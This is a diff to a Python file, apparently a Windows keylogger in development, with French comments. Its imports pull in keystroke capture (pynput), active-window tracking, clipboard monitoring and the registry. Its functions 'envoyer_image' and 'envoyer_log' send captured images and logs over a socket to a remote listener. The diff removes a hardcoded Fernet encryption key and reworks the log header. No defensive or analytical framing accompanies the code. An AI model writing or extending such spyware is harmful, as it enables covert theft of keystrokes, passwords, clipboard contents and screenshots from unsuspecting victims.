@@ -3,7 +3,6 @@ import os
 import platform
 import sys
 import uuid
-from venv import logger
 import winreg
 from pynput import keyboard
 import win32gui
@@ -14,13 +13,10 @@ import pyperclip
 import threading
 import socket
 import io
-from cryptography.fernet import Fernet
 
 current_window = ""
 log_data = {}
 previous_clipboard = ""
-KEY = b'fwFi-YG7gxGvBzeN8UBcyQ5_Vmhwcf0V4FGBKFcHqPI='
-fernet = Fernet(KEY)
 sock = None
 
 try:
@@ -50,6 +46,7 @@ def envoyer_image(img_data, filename):
         return
 
     try:
+          # Chiffrer l'image
         # Envoyer un header simple avec le nom et la taille (longueur)
         header = f"IMAGE|{filename}|{len(img_data)}".encode()
         sock.sendall(header + b"\n")
@@ -66,8 +63,9 @@ def envoyer_log(message):
     if sock is None:
         return
     try:
-        data = f"LOG|{message}".encode()
-        sock.sendall(data + b"\n")
+        data = message.encode()
+        header = f"LOG|".encode()
+        sock.sendall(header + data + b"\n")
     except Exception as e:
         print(f"Erreur envoi log : {e}")
 
